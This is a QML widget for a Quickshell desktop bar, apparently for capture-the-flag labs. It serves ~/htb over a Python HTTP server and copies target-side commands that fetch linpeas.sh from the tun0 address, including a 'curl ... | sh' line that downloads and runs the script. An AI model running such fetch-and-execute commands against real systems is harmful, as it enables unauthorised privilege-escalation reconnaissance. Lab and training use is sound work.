import QtQuick
import Quickshell
import Quickshell.Io
import qs.Commons
import qs.Commons as Commons
import qs.Ui

Panel {
  id: root
  moduleName: "raqune.web-spawner"
  implicitWidth: button.implicitWidth
  implicitHeight: button.implicitHeight

  property bool serverRunning: false
  property string serverPort: "8000"
  property string tun0Ip: "127.0.0.1"

  Process {
    id: statusCheck
    command: ["sh", "-c", "pgrep -fa 'python3 -m http.server' | grep -v grep || true"]
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: { root.serverRunning = text.trim() !== "" }
    }
  }

  Process {
    id: tunCheck
    command: ["sh", "-c", "ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' || echo '127.0.0.1'"]
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: {
        var ip = text.trim()
        root.tun0Ip = ip !== "" ? ip : "127.0.0.1"
      }
    }
  }

  Timer {
    interval: 2500
    running: true
    repeat: true
    triggeredOnStart: true
    onTriggered: {
      if (!statusCheck.running) statusCheck.running = true
      if (!tunCheck.running) tunCheck.running = true
    }
  }

  function toggleServer() {
    if (root.serverRunning) {
      Util.execArgv(["sh", "-c", "pkill -f 'python3 -m http.server'; omarchy-notification-send 'Web Spawner' 'HTTP Server stopped'"])
      root.serverRunning = false
    } else {
      var dir = Quickshell.env("HOME") + "/htb"
      Util.execArgv(["sh", "-c", "mkdir -p " + dir + " && cd " + dir + " && nohup python3 -m http.server " + root.serverPort + " >/dev/null 2>&1 & omarchy-notification-send 'Web Spawner' 'Serving ~/htb on port " + root.serverPort + "'"])
      root.serverRunning = true
    }
    statusCheck.running = true
  }

  function copyCmd(cmd) {
    Util.execArgv(["sh", "-c", "printf '%s' \"$1\" | wl-copy && omarchy-notification-send 'Web Spawner' \"Copied: $1\"", "copy", cmd])
  }

  BarIconButton {
    id: button
    anchors.fill: parent
    bar: root.bar
    slotSize: Style.bar.statusSlot
    tooltipText: root.serverRunning ? ("Web Spawner: :" + root.serverPort + " LIVE") : "Web Spawner (Idle)"
    iconComponent: Component {
      Image {
        cache: false
        source: Qt.resolvedUrl("web-spawner-cad.svg")
        fillMode: Image.PreserveAspectFit
        smooth: true
      }
    }
    onPressed: function(b) {
      if (b === Qt.RightButton) root.toggleServer()
      else root.toggle()
    }
  }

  KeyboardPanel {
    id: panel
    anchorItem: button
    owner: root
    bar: root.bar
    open: root.opened
    focusTarget: keyCatcher
    contentWidth: panel.fittedContentWidth(Style.space(340))
    contentHeight: panel.fittedContentHeight(column.implicitHeight)

    PanelKeyCatcher {
      id: keyCatcher
      anchors.fill: parent
      onCloseRequested: root.close()
      onTabRequested: function(direction) { root.switchPanel(direction) }

      Column {
        id: column
        anchors.left: parent.left
        anchors.right: parent.right
        anchors.top: parent.top
        spacing: Style.space(12)

        PanelHero {
          width: parent.width
          title: "CTF Web Spawner"
          meta: root.serverRunning ? ("SERVING ~/htb ON :" + root.serverPort) : "SERVER STOPPED"
          detail: root.serverRunning ? "ONLINE" : "IDLE"
          foreground: Commons.Color.foreground
          iconComponent: Component {
            Image {
              width: Style.space(24)
              height: Style.space(24)
              cache: false
              source: Qt.resolvedUrl("web-spawner-cad.svg")
              fillMode: Image.PreserveAspectFit
            }
          }
        }

        PanelSeparator { foreground: Commons.Color.foreground }

        Row {
          width: parent.width
          spacing: Style.space(8)

          Button {
            width: parent.width
            text: root.serverRunning ? "Stop HTTP Server" : "Start HTTP Server (:8000)"
            bordered: true
            selected: root.serverRunning
            onClicked: root.toggleServer()
          }
        }

        Row {
          width: parent.width
          spacing: Style.space(8)

          Button {
            width: Math.floor((parent.width - Style.space(8)) / 2)
            text: "Copy wget linpeas"
            bordered: true
            onClicked: root.copyCmd("wget http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh")
          }

          Button {
            width: parent.width - Math.floor((parent.width - Style.space(8)) / 2) - Style.space(8)
            text: "Copy curl | sh"
            bordered: true
            onClicked: root.copyCmd("curl -s http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh | sh")
          }
        }
      }
    }
  }
}
